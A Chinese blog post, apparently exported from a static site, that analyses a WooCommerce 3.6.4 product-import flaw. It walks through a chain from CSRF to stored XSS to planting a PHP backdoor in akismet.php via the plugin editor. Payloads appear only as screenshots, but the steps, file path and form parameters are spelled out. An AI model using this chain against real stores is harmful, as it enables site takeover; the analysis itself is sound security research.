\n\n每一步对应的request分别如下\n\n上传：\n\n![KiovTg.png](https://s2.ax1x.com/2019/10/16/KiovTg.png)\n\n![KiTV7F.png](https://s2.ax1x.com/2019/10/16/KiTV7F.png)\n\n \n\n列映射\n\n![KioXm8.png](https://s2.ax1x.com/2019/10/16/KioXm8.png)![KiTSYj.png](https://s2.ax1x.com/2019/10/16/KiTSYj.png)\n\n![KiTpfs.png](https://s2.ax1x.com/2019/10/16/KiTpfs.png)\n\n \n\n导入\n\n![KiTCpn.png](https://s2.ax1x.com/2019/10/16/KiTCpn.png)\n\n![KiTPlq.png](https://s2.ax1x.com/2019/10/16/KiTPlq.png)\n\n值得一提的是，导入步骤以及后续Done步骤的请求，是第三步列映射(mapping)请求完成后，通过使用admin-ajax.php 实现wordpress的ajax请求来完成的。后续步骤并不需要用户操作。在列映射步骤中，点击运行导入器按钮后，用户只需等待导入完成即可，程序将通过ajax向后台自动发送该导入等请求。\n\n# 漏洞分析\n\n## WooCommerce导入功能代码逻辑分析\n\n我们先来看下，WooCommerce导入功能是怎么运作的\n\n跟入后台代码，看看程序是如何处理导入的四个步骤的\n\n当每个步骤请求发起后，后台都会使用dispatch来处理\n\n![KiTi60.png](https://s2.ax1x.com/2019/10/16/KiTi60.png)\n\n这里简单解释下，首先可见上图中call_user_func执行$this->steps中的值，$this->steps值如下图，是固定的\n\n![KiTFXV.png](https://s2.ax1x.com/2019/10/16/KiTFXV.png)\n\n$this->steps对应了四步操作。\n\n当每一步操作请求发送到后台时，都会调用dispatch方法，从$this->step对应的‘upload’/’mapping’/’import’/’done’这些数组中寻找对应的方法执行，\n\n \n\n![KiTAmT.png](https://s2.ax1x.com/2019/10/16/KiTAmT.png)\n\n如上图，当$_POST['save_step']以及$this->steps[ $this->step ]['handler']非空的情况下，执行\n\n```php\ncall_user_func( $this->steps[ $this->step ]['handler'], $this );\n```\n\n \n\n否则，执行\n\n```php\ncall_user_func( $this->steps[ $this->step ]['view'], $this );\n```\n\n \n\n反观四个上文四个步骤的请求，满足$_POST['save_step']存在的，只有第一步upload\n\n![KiTE0U.png](https://s2.ax1x.com/2019/10/16/KiTE0U.png)\n\nUpload请求发起时，执行\n\ncall_user_func( $this->steps[ $this->step ]['handler'], $this );\n\n我们在数组中查找$this->steps[ $this->step ]['handler']的值，看看此时要执行什么方法，如下图\n\n![KiTek4.png](https://s2.ax1x.com/2019/10/16/KiTek4.png)\n\n从上图可见，此时的$this->steps[ $this->step ]['handler']的值是upload_form_handler，upload_form_handler方法将被执行\n\n \n\n跟入upload_form_handler方法，如下图\n\n![KiTmtJ.png](https://s2.ax1x.com/2019/10/16/KiTmtJ.png)\n\n可见上图288行存在check_admin_referer方法\n\n跟入check_admin_referer方法，如下图\n\n![KiTnh9.png](https://s2.ax1x.com/2019/10/16/KiTnh9.png)\n\n如上图，此时1101行需要检验$REQUEST[$query_arg]的值，该值即为请求中的_wpnonce值\n\n![KiTKpR.png](https://s2.ax1x.com/2019/10/16/KiTKpR.png)\n\n这个nonce值是生成在页面中的，我们没法获取。可见，有了这个nonce的限制，在upload即上传文件的这一步，我们没法采用csrf攻击\n\n \n\n但是除此之外的其他步骤，并不会触发这个方法，其他步骤执行的都是\n\ncall_user_func( $this->steps[ $this->step ]['view'], $this );\n\n$this->steps[ $this->step ]['view']中的方法，并没有检查nonce\n\n在WooCommerce插件的导入模块中，只在upload这一步，加入了nonce，进行了csrf防御。也就是说，其他步骤并没有对csrf进行防御\n\n \n\n既然我们没有办法进行csrf攻击，来上传恶意csv，那是否还有其他办法上传呢？\n\n其实，这个恶意的csv并不需要管理员来上传，拥有作者权限的用户，可以自行上传csv文件到wordpress目录\n\n![KiTM11.png](https://s2.ax1x.com/2019/10/16/KiTM11.png)\n\n直接在媒体里上传就行了\n\n但是这个csv，是需要管理员权限，才能导入到woocommerce的产品中\n\n \n\n## 漏洞利用思路\n\n通过上文我们对导入功能代码的分析可以发现，该插件对csv文件的上传(upload)步骤，做了csrf防护，但是随后三个步骤，并没有进行csrf防护。虽然我们没法对上传步骤发起csrf攻击，但是我们可以绕过上传步骤，直接攻击后续步骤\n\nWordpress对作者权限的用户，开放上传媒体文件的权限，如下图\n\n![KiTQ6x.png](https://s2.ax1x.com/2019/10/16/KiTQ6x.png)\n\n我们可以利用这个功能，替换有csrf保护的upload步骤\n\n此时的思路是：\n\n1、 使用有作者权限的用户在媒体库上传一个恶意的csv文件\n\n2、 构造csrf，诱骗管理员执行发起导入产品请求，将我们上传的csv导入woocommerce的产品中\n\n3、导入成功，产品中被插入xss\n\n4、管理员访问产品页面，xss执行\n\n接下来验证我们的思路\n\n### 上传一个恶意的csv文件\n\n首先，我们构造了一个csv\n\n![KiTlX6.png](https://s2.ax1x.com/2019/10/16/KiTlX6.png)\n\n接着，我们用作者权限的用户上传媒体库\n\n![KiT3nK.png](https://s2.ax1x.com/2019/10/16/KiT3nK.png)\n\n最后，记录上传好的地址\n\nwp-content/uploads/2019/10/products-6.csv\n\n上传部分完成\n\n \n\n### 构造csrf诱使管理员导入\n\n我们先来看下正常情况下，导入csv的过程的请求\n\n![KiT80O.png](https://s2.ax1x.com/2019/10/16/KiT80O.png)\n\n \n\nHead\n\n![KiTG7D.png](https://s2.ax1x.com/2019/10/16/KiTG7D.png)\n\nBody\n\n![KiTYAe.png](https://s2.ax1x.com/2019/10/16/KiTYAe.png)\n\n可以发现，在body中存在一个security参数\n\n在后台程序校验上传请求是否合法时，会对post body中该参数进行校验，如下图\n\n![KiTttH.png](https://s2.ax1x.com/2019/10/16/KiTttH.png)\n\n问题又来了，虽然导入请求没有csrf token的保护，但是如果我们想直接构造一个上图的导入表单，通过来诱骗管理员访问并提交如上请求来导入恶意csv，就需要知道这个security参数值。\n\n这个security参数是如何生成的？我们是否可以伪造这个参数？或者，既然这是一个ajax请求，我们能否绕开这个security?\n\n \n\n#### security参数值分析\n\n这个参数是由上一个step(mapping列映射)的请求生成的\n\n![KiTNhd.png](https://s2.ax1x.com/2019/10/16/KiTNhd.png)\n\nHead\n\n![KiTa9A.png](https://s2.ax1x.com/2019/10/16/KiTa9A.png)\n\n \n\nBody\n\n![KiTd1I.png](https://s2.ax1x.com/2019/10/16/KiTd1I.png)\n\n当这个请求执行后，在相应的body中，会包含我们所需要的security参数值\n\n![KiTwct.png](https://s2.ax1x.com/2019/10/16/KiTwct.png)\n\n注意看上图红框处的import_nonce值，与我们上文中的security参数值是一样的\n\n#### Security算法分析\n\n跟踪后台代码，分析下这个import_nonce/Security值是如何计算出来的\n\n![KiT0jP.png](https://s2.ax1x.com/2019/10/16/KiT0jP.png)\n\nImport_nonce的产生如上图所示，是通过wp_create_nonce方法计算而来\n\n跟入wp_create_nonce方法\n\n![KiTDnf.png](https://s2.ax1x.com/2019/10/16/KiTDnf.png)\n\n可见最终计算Import_nonce值，需要使用$i，$action，$uid，$token四个变量\n\n \n\n变量$i由wp_nonce_tick方法生成，跟入wp_nonce_tick方法看一下\n\n![KiTrB8.png](https://s2.ax1x.com/2019/10/16/KiTrB8.png)\n\n可见这个是用来计算nonce失效时间的，上图中的$nonce_life默认都是86400,也就是一天的总秒数，而上图2053行最终计算表达式不难看出，只要是半天内($nonce_life/2)生成的, wp_nonce_tick方法返回的这个值都应该是一样的。也就是说，Import_nonce值的生存期是半天(43200s)\n\n \n\n接下来几个参数就很简单了，$action是固定的'wc-product-import'，uid，token这些都是管理员的值\n\n \n\n#### 我们是否需要关心security参数值？\n\n但事实上，我们并不需要关心这个security参数值，甚至根本不用去构造import这一步的请求。\n\n在Import这个步骤中，向后台发送的是ajax请求，这个请求并不是用户点击发送表单完成的，而是mapping步骤完成后，连带一同发起的。我们只需构造与发送mapping步骤的请求，程序将通过ajax自动完成后续import 以及Done步骤，因此，我们根本不需要关心Import步骤中的security值。\n\n详细分析如下：\n\n仍然看mapping列映射这一步的请求的后台代码，仍然分析下图这块代码 \n\n![KiTsHS.png](https://s2.ax1x.com/2019/10/16/KiTsHS.png)\n\n上文我们分析了这块代码的432行，也就是security值是如何计算出来的，但却没有介绍这块代码的实际作用\n\n这里`wp_localize_script()`使用JavaScript变量的数据对注册的脚本进行本地化操作，接着在442行处使用wp_enqueue_script将JS脚本添加到WordPress程序生成的页面当中。如上图，`wc_product_import_params`变量中的所有数据都由攻击者控制，例如其中重要的file路径。\n\nmapping列映射这个请求完成后的生成页面，将使用AJAX请求将攻击者控制的`$_POST`变量和有效的随机数一起发送到WordPress后端，完成导入步骤。\n\n \n\n也就是说，我们只需构造mapping列映射这一步骤的表单，诱使管理员访问，在mapping列映射完成后的返回页面中，存在发起import步骤的js代码，当页面被浏览器加载时，使用AJAX请求将攻击者控制的`$_POST`变量和有效的随机数一起发送到WordPress后端，完成后续的导入步骤。\n\n### 导入成功以及XSS触发\n\n将构造好的mapping步骤表单链接诱使管理员点击，恶意csv被会被导入，此时查看产品列表，如下图\n\n![KiT6Ag.png](https://s2.ax1x.com/2019/10/16/KiT6Ag.png)\n\n这条恶意的产品信息已经存在于产品列表中\n\n \n\n当打开产品页面时，其中的脚本就会被执行\n\n![KiTcNQ.png](https://s2.ax1x.com/2019/10/16/KiTcNQ.png)\n\n \n\n# 漏洞利用\n\n根据上文我们分析，我们只需构造mapping列映射这一步骤的表单，诱使管理员访问，即可完成mapping列映射以及导入步骤。\n\n \n\n最终payload如下\n\n![KiTghj.png](https://s2.ax1x.com/2019/10/16/KiTghj.png)\n\n这里的&file=../wp-content/uploads/2019/10/products-6.csv为之前步骤中，上传的恶意csv的路径，需要根据实际情况构造\n\nPayload中form的两个input，map_from与map_to，是mapping列映射步骤后台必须存在的参数，参见下图代码\n\n![KiTR9s.png](https://s2.ax1x.com/2019/10/16/KiTR9s.png)\n\n需要注意的是，我们构造的js语句插入在csv中哪个字段，这里的map_from map_to就要写对应的字段名称，否则导入时会出错\n\n \n\n管理员访问该payload，csrf漏洞将会被触发。表单被提交后，首先完成mapping步骤，接着，程序通过ajax自动发送import以及done步骤的请求，完成后续步骤。稍加等待，我们恶意的产品数据将会被导入，当管理员访问产品页面时，插入的js脚本将会被执行\n\n \n\n# XSS to RCE\n\nWordpress中允许博客管理员编辑管理控制台中的主题和插件文件。通过滥用XSS漏洞，攻击者可以在远程服务器上执行任意PHP代码。\n\n例如我们可以通过编辑插件功能，在后台写下payload\n\n![KiTW3n.png](https://s2.ax1x.com/2019/10/16/KiTW3n.png)\n\n编辑插件页面如上图\n\n我们构造恶意csv如下图\n\n![KiTfcq.png](https://s2.ax1x.com/2019/10/16/KiTfcq.png)\n\n \n\n构造csrf表单如下图\n\n![KiThj0.png](https://s2.ax1x.com/2019/10/16/KiThj0.png)\n\n当管路员访问我们的csrf表单，恶意的csv将会被导入\n\n当管理员访问该产品页面时，插入产品描述内容中的js脚本将会被执行，akismet.php中的内容将会被修改，从而达到的插入后门的作用，如下图\n\n![KiT5uV.png](https://s2.ax1x.com/2019/10/16/KiT5uV.png)","source":"_posts/woocommerce-csrf-rce.md","raw":"---\ntitle: WordPress-WooCommerce 3.6.4 从CSRF 到 RCE\ndate: 2019-10-16 14:49:36\ntags: web漏洞分析\ncategories: 技术\ncover: https://s2.ax1x.com/2019/10/16/KFCN4I.png\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\nWooCommerce是WordPress最受欢迎的电子商务插件，安装量超过500万。\n\nWooCommerce处理产品导入方式的缺陷导致存储型XSS漏洞的产生，可以通过跨站点请求伪造（CSRF）来利用该漏洞。由于wordpress后台存在插件编辑等功能，通过xss漏洞，可以写入php代码\n\n<!--more-->\n\n# 漏洞简介\n\nWooCommerce是WordPress最受欢迎的电子商务插件，安装量超过500万。\n\nWooCommerce处理产品导入方式的缺陷导致存储型XSS漏洞的产生，可以通过跨站点请求伪造（CSRF）来利用该漏洞。由于wordpress后台存在插件编辑等功能，通过xss漏洞，可以写入php代码\n\n \n\n漏洞成因简单来说，是因为WooCommerce存在csv文件导入功能，该功能可以将csv中内容导入到产品列表中\n\n导入时共分四步(上传、列映射、导入以及done)，这四个步骤的请求是独立的，可以单独发送对应的请求，在后台完成相应的功能。\n\nWooCommerce只在第一步(上传csv文件)的时候验证了csrf token，而后续步骤并没有进行csrf防护。由于一定权限的wordpress用户可以直接在wordpress媒体库中上传csv文件，这将替代了有csrf防护的第一步，进而通过CSRF漏洞衔接后三步，导致了本次漏洞的产生。\n\n \n\n在这篇文章中，我将会为大家分析WooCommerce插件后台代码，分析本次漏洞成因，并还原本次漏洞利用，介绍POC的构造以及一些wordpress机制。\n\n \n\n## WooCommerce导入功能介绍\n\nWooCommerce可以通过csv文件导入产品\n\n![KiozkQ.png](https://s2.ax1x.com/2019/10/16/KiozkQ.png)\n\n \n\n导入之后如下图所示\n\n![Kioj0S.png](https://s2.ax1x.com/2019/10/16/Kioj0S.png)\n\nWooCommerce中的每个产品都有一个产品说明，商店经理可以在其中插入有限的HTML，即非常基本的HTML标签和属性，例如`<a>`与`href`属性结合的标签。\n\n \n\n导入过程分为四步：上传、列映射、导入以及done！\n\n \n\n每一步对应的request分别如下\n\n上传：\n\n![KiovTg.png](https://s2.ax1x.com/2019/10/16/KiovTg.png)\n\n![KiTV7F.png](https://s2.ax1x.com/2019/10/16/KiTV7F.png)\n\n \n\n列映射\n\n![KioXm8.png](https://s2.ax1x.com/2019/10/16/KioXm8.png)![KiTSYj.png](https://s2.ax1x.com/2019/10/16/KiTSYj.png)\n\n![KiTpfs.png](https://s2.ax1x.com/2019/10/16/KiTpfs.png)\n\n \n\n导入\n\n![KiTCpn.png](https://s2.ax1x.com/2019/10/16/KiTCpn.png)\n\n![KiTPlq.png](https://s2.ax1x.com/2019/10/16/KiTPlq.png)\n\n值得一提的是，导入步骤以及后续Done步骤的请求，是第三步列映射(mapping)请求完成后，通过使用admin-ajax.php 实现wordpress的ajax请求来完成的。后续步骤并不需要用户操作。在列映射步骤中，点击运行导入器按钮后，用户只需等待导入完成即可，程序将通过ajax向后台自动发送该导入等请求。\n\n# 漏洞分析\n\n## WooCommerce导入功能代码逻辑分析\n\n我们先来看下，WooCommerce导入功能是怎么运作的\n\n跟入后台代码，看看程序是如何处理导入的四个步骤的\n\n当每个步骤请求发起后，后台都会使用dispatch来处理\n\n![KiTi60.png](https://s2.ax1x.com/2019/10/16/KiTi60.png)\n\n这里简单解释下，首先可见上图中call_user_func执行$this->steps中的值，$this->steps值如下图，是固定的\n\n![KiTFXV.png](https://s2.ax1x.com/2019/10/16/KiTFXV.png)\n\n$this->steps对应了四步操作。\n\n当每一步操作请求发送到后台时，都会调用dispatch方法，从$this->step对应的‘upload’/’mapping’/’import’/’done’这些数组中寻找对应的方法执行，\n\n \n\n![KiTAmT.png](https://s2.ax1x.com/2019/10/16/KiTAmT.png)\n\n如上图，当$_POST['save_step']以及$this->steps[ $this->step ]['handler']非空的情况下，执行\n\n```php\ncall_user_func( $this->steps[ $this->step ]['handler'], $this );\n```\n\n \n\n否则，执行\n\n```php\ncall_user_func( $this->steps[ $this->step ]['view'], $this );\n```\n\n \n\n反观四个上文四个步骤的请求，满足$_POST['save_step']存在的，只有第一步upload\n\n![KiTE0U.png](https://s2.ax1x.com/2019/10/16/KiTE0U.png)\n\nUpload请求发起时，执行\n\ncall_user_func( $this->steps[ $this->step ]['handler'], $this );\n\n我们在数组中查找$this->steps[ $this->step ]['handler']的值，看看此时要执行什么方法，如下图\n\n![KiTek4.png](https://s2.ax1x.com/2019/10/16/KiTek4.png)\n\n从上图可见，此时的$this->steps[ $this->step ]['handler']的值是upload_form_handler，upload_form_handler方法将被执行\n\n \n\n跟入upload_form_handler方法，如下图\n\n![KiTmtJ.png](https://s2.ax1x.com/2019/10/16/KiTmtJ.png)\n\n可见上图288行存在check_admin_referer方法\n\n跟入check_admin_referer方法，如下图\n\n![KiTnh9.png](https://s2.ax1x.com/2019/10/16/KiTnh9.png)\n\n如上图，此时1101行需要检验$REQUEST[$query_arg]的值，该值即为请求中的_wpnonce值\n\n![KiTKpR.png](https://s2.ax1x.com/2019/10/16/KiTKpR.png)\n\n这个nonce值是生成在页面中的，我们没法获取。可见，有了这个nonce的限制，在upload即上传文件的这一步，我们没法采用csrf攻击\n\n \n\n但是除此之外的其他步骤，并不会触发这个方法，其他步骤执行的都是\n\ncall_user_func( $this->steps[ $this->step ]['view'], $this );\n\n$this->steps[ $this->step ]['view']中的方法，并没有检查nonce\n\n在WooCommerce插件的导入模块中，只在upload这一步，加入了nonce，进行了csrf防御。也就是说，其他步骤并没有对csrf进行防御\n\n \n\n既然我们没有办法进行csrf攻击，来上传恶意csv，那是否还有其他办法上传呢？\n\n其实，这个恶意的csv并不需要管理员来上传，拥有作者权限的用户，可以自行上传csv文件到wordpress目录\n\n![KiTM11.png](https://s2.ax1x.com/2019/10/16/KiTM11.png)\n\n直接在媒体里上传就行了\n\n但是这个csv，是需要管理员权限，才能导入到woocommerce的产品中\n\n \n\n## 漏洞利用思路\n\n通过上文我们对导入功能代码的分析可以发现，该插件对csv文件的上传(upload)步骤，做了csrf防护，但是随后三个步骤，并没有进行csrf防护。虽然我们没法对上传步骤发起csrf攻击，但是我们可以绕过上传步骤，直接攻击后续步骤\n\nWordpress对作者权限的用户，开放上传媒体文件的权限，如下图\n\n![KiTQ6x.png](https://s2.ax1x.com/2019/10/16/KiTQ6x.png)\n\n我们可以利用这个功能，替换有csrf保护的upload步骤\n\n此时的思路是：\n\n1、 使用有作者权限的用户在媒体库上传一个恶意的csv文件\n\n2、 构造csrf，诱骗管理员执行发起导入产品请求，将我们上传的csv导入woocommerce的产品中\n\n3、导入成功，产品中被插入xss\n\n4、管理员访问产品页面，xss执行\n\n接下来验证我们的思路\n\n### 上传一个恶意的csv文件\n\n首先，我们构造了一个csv\n\n![KiTlX6.png](https://s2.ax1x.com/2019/10/16/KiTlX6.png)\n\n接着，我们用作者权限的用户上传媒体库\n\n![KiT3nK.png](https://s2.ax1x.com/2019/10/16/KiT3nK.png)\n\n最后，记录上传好的地址\n\nwp-content/uploads/2019/10/products-6.csv\n\n上传部分完成\n\n \n\n### 构造csrf诱使管理员导入\n\n我们先来看下正常情况下，导入csv的过程的请求\n\n![KiT80O.png](https://s2.ax1x.com/2019/10/16/KiT80O.png)\n\n \n\nHead\n\n![KiTG7D.png](https://s2.ax1x.com/2019/10/16/KiTG7D.png)\n\nBody\n\n![KiTYAe.png](https://s2.ax1x.com/2019/10/16/KiTYAe.png)\n\n可以发现，在body中存在一个security参数\n\n在后台程序校验上传请求是否合法时，会对post body中该参数进行校验，如下图\n\n![KiTttH.png](https://s2.ax1x.com/2019/10/16/KiTttH.png)\n\n问题又来了，虽然导入请求没有csrf token的保护，但是如果我们想直接构造一个上图的导入表单，通过来诱骗管理员访问并提交如上请求来导入恶意csv，就需要知道这个security参数值。\n\n这个security参数是如何生成的？我们是否可以伪造这个参数？或者，既然这是一个ajax请求，我们能否绕开这个security?\n\n \n\n#### security参数值分析\n\n这个参数是由上一个step(mapping列映射)的请求生成的\n\n![KiTNhd.png](https://s2.ax1x.com/2019/10/16/KiTNhd.png)\n\nHead\n\n![KiTa9A.png](https://s2.ax1x.com/2019/10/16/KiTa9A.png)\n\n \n\nBody\n\n![KiTd1I.png](https://s2.ax1x.com/2019/10/16/KiTd1I.png)\n\n当这个请求执行后，在相应的body中，会包含我们所需要的security参数值\n\n![KiTwct.png](https://s2.ax1x.com/2019/10/16/KiTwct.png)\n\n注意看上图红框处的import_nonce值，与我们上文中的security参数值是一样的\n\n#### Security算法分析\n\n跟踪后台代码，分析下这个import_nonce/Security值是如何计算出来的\n\n![KiT0jP.png](https://s2.ax1x.com/2019/10/16/KiT0jP.png)\n\nImport_nonce的产生如上图所示，是通过wp_create_nonce方法计算而来\n\n跟入wp_create_nonce方法\n\n![KiTDnf.png](https://s2.ax1x.com/2019/10/16/KiTDnf.png)\n\n可见最终计算Import_nonce值，需要使用$i，$action，$uid，$token四个变量\n\n \n\n变量$i由wp_nonce_tick方法生成，跟入wp_nonce_tick方法看一下\n\n![KiTrB8.png](https://s2.ax1x.com/2019/10/16/KiTrB8.png)\n\n可见这个是用来计算nonce失效时间的，上图中的$nonce_life默认都是86400,也就是一天的总秒数，而上图2053行最终计算表达式不难看出，只要是半天内($nonce_life/2)生成的, wp_nonce_tick方法返回的这个值都应该是一样的。也就是说，Import_nonce值的生存期是半天(43200s)\n\n \n\n接下来几个参数就很简单了，$action是固定的'wc-product-import'，uid，token这些都是管理员的值\n\n \n\n#### 我们是否需要关心security参数值？\n\n但事实上，我们并不需要关心这个security参数值，甚至根本不用去构造import这一步的请求。\n\n在Import这个步骤中，向后台发送的是ajax请求，这个请求并不是用户点击发送表单完成的，而是mapping步骤完成后，连带一同发起的。我们只需构造与发送mapping步骤的请求，程序将通过ajax自动完成后续import 以及Done步骤，因此，我们根本不需要关心Import步骤中的security值。\n\n详细分析如下：\n\n仍然看mapping列映射这一步的请求的后台代码，仍然分析下图这块代码 \n\n![KiTsHS.png](https://s2.ax1x.com/2019/10/16/KiTsHS.png)\n\n上文我们分析了这块代码的432行，也就是security值是如何计算出来的，但却没有介绍这块代码的实际作用\n\n这里`wp_localize_script()`使用JavaScript变量的数据对注册的脚本进行本地化操作，接着在442行处使用wp_enqueue_script将JS脚本添加到WordPress程序生成的页面当中。如上图，`wc_product_import_params`变量中的所有数据都由攻击者控制，例如其中重要的file路径。\n\nmapping列映射这个请求完成后的生成页面，将使用AJAX请求将攻击者控制的`$_POST`变量和有效的随机数一起发送到WordPress后端，完成导入步骤。\n\n \n\n也就是说，我们只需构造mapping列映射这一步骤的表单，诱使管理员访问，在mapping列映射完成后的返回页面中，存在发起import步骤的js代码，当页面被浏览器加载时，使用AJAX请求将攻击者控制的`$_POST`变量和有效的随机数一起发送到WordPress后端，完成后续的导入步骤。\n\n### 导入成功以及XSS触发\n\n将构造好的mapping步骤表单链接诱使管理员点击，恶意csv被会被导入，此时查看产品列表，如下图\n\n![KiT6Ag.png](https://s2.ax1x.com/2019/10/16/KiT6Ag.png)\n\n这条恶意的产品信息已经存在于产品列表中\n\n \n\n当打开产品页面时，其中的脚本就会被执行\n\n![KiTcNQ.png](https://s2.ax1x.com/2019/10/16/KiTcNQ.png)\n\n \n\n# 漏洞利用\n\n根据上文我们分析，我们只需构造mapping列映射这一步骤的表单，诱使管理员访问，即可完成mapping列映射以及导入步骤。\n\n \n\n最终payload如下\n\n![KiTghj.png](https://s2.ax1x.com/2019/10/16/KiTghj.png)\n\n这里的&file=../wp-content/uploads/2019/10/products-6.csv为之前步骤中，上传的恶意csv的路径，需要根据实际情况构造\n\nPayload中form的两个input，map_from与map_to，是mapping列映射步骤后台必须存在的参数，参见下图代码\n\n![KiTR9s.png](https://s2.ax1x.com/2019/10/16/KiTR9s.png)\n\n需要注意的是，我们构造的js语句插入在csv中哪个字段，这里的map_from map_to就要写对应的字段名称，否则导入时会出错\n\n \n\n管理员访问该payload，csrf漏洞将会被触发。表单被提交后，首先完成mapping步骤，接着，程序通过ajax自动发送import以及done步骤的请求，完成后续步骤。稍加等待，我们恶意的产品数据将会被导入，当管理员访问产品页面时，插入的js脚本将会被执行\n\n \n\n# XSS to RCE\n\nWordpress中允许博客管理员编辑管理控制台中的主题和插件文件。通过滥用XSS漏洞，攻击者可以在远程服务器上执行任意PHP代码。\n\n例如我们可以通过编辑插件功能，在后台写下payload\n\n![KiTW3n.png](https://s2.ax1x.com/2019/10/16/KiTW3n.png)\n\n编辑插件页面如上图\n\n我们构造恶意csv如下图\n\n![KiTfcq.png](https://s2.ax1x.com/2019/10/16/KiTfcq.png)\n\n \n\n构造csrf表单如下图\n\n![KiThj0.png](https://s2.ax1x.com/2019/10/16/KiThj0.png)\n\n当管路员访问我们的csrf表单，恶意的csv将会被导入\n\n当管理员访问该产品页面时，插入产品描述内容中的js脚本将会被执行，akismet.php中的内容将会被修改，从而达到的插入后门的作用，如下图\n\n![KiT5uV.png](https://s2.ax1x.com/2019/10/16/KiT5uV.png)","slug":"woocommerce-csrf-rce","published":1,"updated":"2020-10-27T09:25:29.880Z","_id":"ckgrozua50057wsa93lga3g11","comments":1,"layout":"post","photos":[],"link":"","content":"<p>WooCommerce是WordPress最受欢迎的电子商务插件，安装量超过500万。</p>\n<p>WooCommerce处理产品导入方式的缺陷导致存储型XSS漏洞的产生，可以通过跨站点请求伪造（CSRF）来利用该漏洞。由于wordpress后台存在插件编辑等功能，通过xss漏洞，可以写入php代码</p>\n<a id=\"more\"></a>\n\n<h1 id=\"漏洞简介\"><a href=\"#漏洞简介\" class=\"headerlink\" title=\"漏洞简介\"></a>漏洞简介</h1><p>WooCommerce是WordPress最受欢迎的电子商务插件，安装量超过500万。</p>\n<p>WooCommerce处理产品导入方式的缺陷导致存储型XSS漏洞的产生，可以通过跨站点请求伪造（CSRF）来利用该漏洞。由于wordpress后台存在插件编辑等功能，通过xss漏洞，可以写入php代码</p>\n<p>漏洞成因简单来说，是因为WooCommerce存在csv文件导入功能，该功能可以将csv中内容导入到产品列表中</p>\n<p>导入时共分四步(上传、列映射、导入以及done)，这四个步骤的请求是独立的，可以单独发送对应的请求，在后台完成相应的功能。</p>\n<p>WooCommerce只在第一步(上传csv文件)的时候验证了csrf token，而后续步骤并没有进行csrf防护。由于一定权限的wordpress用户可以直接在wordpress媒体库中上传csv文件，这将替代了有csrf防护的第一步，进而通过CSRF漏洞衔接后三步，导致了本次漏洞的产生。</p>\n<p>在这篇文章中，我将会为大家分析WooCommerce插件后台代码，分析本次漏洞成因，并还原本次漏洞利用，介绍POC的构造以及一些wordpress机制。</p>\n<h2 id=\"WooCommerce导入功能介绍\"><a href=\"#WooCommerce导入功能介绍\" class=\"headerlink\" title=\"WooCommerce导入功能介绍\"></a>WooCommerce导入功能介绍</h2><p>WooCommerce可以通过csv文件导入产品</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiozkQ.png\" alt=\"KiozkQ.png\"></p>\n<p>导入之后如下图所示</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/Kioj0S.png\" alt=\"Kioj0S.png\"></p>\n<p>WooCommerce中的每个产品都有一个产品说明，商店经理可以在其中插入有限的HTML，即非常基本的HTML标签和属性，例如<code>&lt;a&gt;</code>与<code>href</code>属性结合的标签。</p>\n<p>导入过程分为四步：上传、列映射、导入以及done！</p>\n<p>每一步对应的request分别如下</p>\n<p>上传：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiovTg.png\" alt=\"KiovTg.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiTV7F.png\" alt=\"KiTV7F.png\"></p>\n<p>列映射</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KioXm8.png\" alt=\"KioXm8.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiTSYj.png\" alt=\"KiTSYj.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiTpfs.png\" alt=\"KiTpfs.png\"></p>\n<p>导入</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiTCpn.png\" alt=\"KiTCpn.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiTPlq.png\" alt=\"KiTPlq.png\"></p>\n<p>值得一提的是，导入步骤以及后续Done步骤的请求，是第三步列映射(mapping)请求完成后，通过使用admin-ajax.php 实现wordpress的ajax请求来完成的。后续步骤并不需要用户操作。在列映射步骤中，点击运行导入器按钮后，用户只需等待导入完成即可，程序将通过ajax向后台自动发送该导入等请求。</p>\n<h1 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h1><h2 id=\"WooCommerce导入功能代码逻辑分析\"><a href=\"#WooCommerce导入功能代码逻辑分析\" class=\"headerlink\" title=\"WooCommerce导入功能代码逻辑分析\"></a>WooCommerce导入功能代码逻辑分析</h2><p>我们先来看下，WooCommerce导入功能是怎么运作的</p>\n<p>跟入后台代码，看看程序是如何处理导入的四个步骤的</p>\n<p>当每个步骤请求发起后，后台都会使用dispatch来处理</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiTi60.png\" alt=\"KiTi60.png\"></p>\n<p>这里简单解释下，首先可见上图中call_user_func执行$this-&gt;steps中的值，$this-&gt;steps值如下图，是固定的</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiTFXV.png\" alt=\"KiTFXV.png\"></p>\n<p>$this-&gt;steps对应了四步操作。</p>\n<p>当每一步操作请求发送到后台时，都会调用dispatch方法，从$this-&gt;step对应的‘upload’/’mapping’/’import’/’done’这些数组中寻找对应的方法执行，</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/10/16/KiTAmT.png\" alt=\"KiTAmT.png\"></p>\n<p>如上图，当$_POST[‘save_step’]以及$this-&gt;steps[ $this-&gt;step ][‘handler’]非空的情况下，执行</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">call_user_func( <span class=\"keyword\">$this</span>-&gt;steps[ <span class=\"keyword\">$this</span>-&gt;step ][<span class=\"string\">&#x27;handler&#x27;</span>], <span class=\"keyword\">$this</span> 